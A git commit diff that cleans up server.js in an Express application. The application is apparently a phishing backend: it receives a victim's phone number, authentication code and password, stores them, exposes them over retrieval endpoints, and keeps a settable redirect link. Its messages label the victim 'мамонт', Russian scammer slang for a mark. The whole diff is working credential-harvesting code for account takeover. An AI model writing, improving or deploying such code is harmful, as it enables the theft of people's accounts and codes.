2adf357e9856742ec6ba887095f8ae359fc164d7
antonprilepin <155925393+antonprilepin@users.noreply.github.com>
2024-08-15 13:02:16 +0300

    Update server.js

--- server.js
+++ server.js
@@ -17,105 +17,89 @@ app.use(express.json());
 let pn;
 let code;
 let pass;
-let redirectLink; // Новая переменная для хранения ссылки
+let redirectLink; // Переменная для хранения ссылки
 
 // Обработка номера телефона
 app.post('/phone', (req, res) => {
     const phone_number = req.body.phone_number;
-    if (typeof phone_number !== 'undefined') {
+    if (phone_number) {
         pn = phone_number;
         console.log(`Номер телефона мамонта: ${phone_number}`);
         res.json({ message: `Номер телефона мамонта: ${phone_number}` });
-        return;
     } else {
-        console.log('Номер телефона мамонта неопределен.');
         res.status(400).json({ error: 'Номер телефона мамонта неопределен.' });
-        return;
     }
 });
 
+// Получение номера телефона
 app.get('/getPhone', (req, res) => {
-    if(pn){
+    if (pn) {
         res.send(`Номер телефона мамонта: ${pn}`);
-        return;
     } else {
         res.status(404).send('Номер телефона мамонта не найден.');
-        return;
     }
 });
 
 // Обработка кода
 app.post('/authCode', (req, res) => {
     const value = req.body.value;
-    if (typeof value !== 'undefined') {
+    if (value) {
         code = value;
         console.log(`Код мамонта: ${value}`);
         res.json({ message: `Код мамонта: ${value}` });
-        return;
     } else {
-        console.log('Код мамонта неопределен.');
         res.status(400).json({ error: 'Код мамонта неопределен.' });
-        return;
     }
 });
 
+// Получение кода
 app.get('/getCode', (req, res) => {
-    if(code){
+    if (code) {
         res.send(`Код мамонта:\n${code}`);
-        return;
     } else {
         res.status(404).send('Код мамонта не найден.');
-        return;
     }
 });
 
 // Обработка пароля
 app.post('/password', (req, res) => {
     const password = req.body.passwordInput;
-    if (typeof password !== 'undefined') {
+    if (password) {
         pass = password;
         console.log(`Пароль мамонта: ${password}`);
         res.json({ message: `Пароль мамонта: ${password}` });
-        return;
     } else {
-        console.log('Пароль мамонта неопределен.');
         res.status(400).json({ error: 'Пароль мамонта неопределен.' });
-        return;
     }
 });
 
+// Получение пароля
 app.get('/getPassword', (req, res) => {
-    if(pass){
+    if (pass) {
         res.send(`Пароль мамонта: ${pass}`);
-        return;
     } else {
         res.status(404).send('Пароль мамонта не найден.');
-        return;
     }
 });
 
 // Обработка ссылки
 app.post('/redirect-link', (req, res) => {
     const { link } = req.body;
-    if (typeof link !== 'undefined') {
+    if (link) {
         redirectLink = link;
         console.log(`Ссылка установлена: ${link}`);
         res.json({ message: `Ссылка установлена: ${link}` });
-        return;
     } else {
-        console.log('Ссылка неопределена.');
         res.status(400).json({ error: 'Ссылка неопределена.' });
-        return;
     }
 });
 
+// Получение ссылки
 app.get('/redirect-link', (req, res) => {
-    if(redirectLink){
+    if (redirectLink) {
         res.json({ link: redirectLink });
-        return;
     } else {
         res.status(404).send('Ссылка не найдена.');
-        return;
     }
 });
 
